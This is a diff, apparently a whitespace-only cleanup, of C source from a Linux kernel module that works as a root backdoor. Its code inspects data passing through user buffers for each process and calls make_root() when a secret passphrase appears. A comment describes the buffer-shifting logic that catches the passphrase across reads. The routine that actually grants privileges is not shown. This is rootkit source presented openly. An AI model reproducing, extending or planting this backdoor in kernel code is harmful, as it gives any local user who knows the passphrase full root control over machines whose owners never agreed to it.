@@ -22,7 +22,7 @@ is_valid(char *buf, size_t size)
         if((buf[0] >= 'a' && buf[0] <= 'z') || buf[0] == '_') {
             return strspn(buf, accept) > 0;
         }
-        
+
         return 0;
     }
 
@@ -34,11 +34,11 @@ add_entry(pid_t key)
 {
     struct pid_entry *cur;
     struct pid_entry *new = kzalloc(sizeof(struct pid_entry), GFP_KERNEL);
+
     new->pid = key;
     new->str = kzalloc(MAX_BUF, GFP_KERNEL);
     new->capacity = MAX_BUF;
     new->iter = 0;
-
 
     int found = 0;
     hash_for_each_possible(pid_ht, cur, hlist, key)
@@ -53,7 +53,7 @@ static void
 remove_entry(pid_t key)
 {
     struct pid_entry *cur;
-   
+
     hash_for_each_possible(pid_ht, cur, hlist, key) {
         if(cur->pid == key) {
             kfree(cur->str);
@@ -79,13 +79,13 @@ get_entry(pid_t key)
  * The idea here is to fill up our buffer as much as we can
  * Should we reach the maximum capacity, we first of all
  * compare what we read so far; if it's a match, grant root
- * Otherwise, we can safely move the last 11 bytes to the start 
- * (as the worst case is reading 'make_me_roo', which 
+ * Otherwise, we can safely move the last 11 bytes to the start
+ * (as the worst case is reading 'make_me_roo', which
  * is 11 characters long)
  * This means we need to offset str with (23 - 11) = 12 = SHIFT_OFF
  **/
 static void
-handle_compare(char *buf, pid_t pid, size_t size) 
+handle_compare(char *buf, pid_t pid, size_t size)
 {
     struct pid_entry *entry;
     entry = get_entry(pid);
@@ -100,7 +100,7 @@ handle_compare(char *buf, pid_t pid, size_t size)
             i++;
             entry->iter++;
         }
-        
+
         if(strnstr(entry->str, PASSPHRASE, MAX_BUF)) {
             make_root();
             return;
@@ -112,7 +112,6 @@ handle_compare(char *buf, pid_t pid, size_t size)
 
             goto fill;
         }
-
     }
 
     if(strstr(entry->str, PASSPHRASE))
@@ -122,9 +121,9 @@ handle_compare(char *buf, pid_t pid, size_t size)
 void
 handle_pid(pid_t pid, __user char *buf, size_t size)
 {
-    char *str = kzalloc(size, GFP_KERNEL);   
+    char *str = kzalloc(size, GFP_KERNEL);
     copy_from_user(str, buf, size);
-    
+
     //Early return on exact match, avoiding more expensive operations
     if(strnstr(str, PASSPHRASE, size)) {
         make_root();
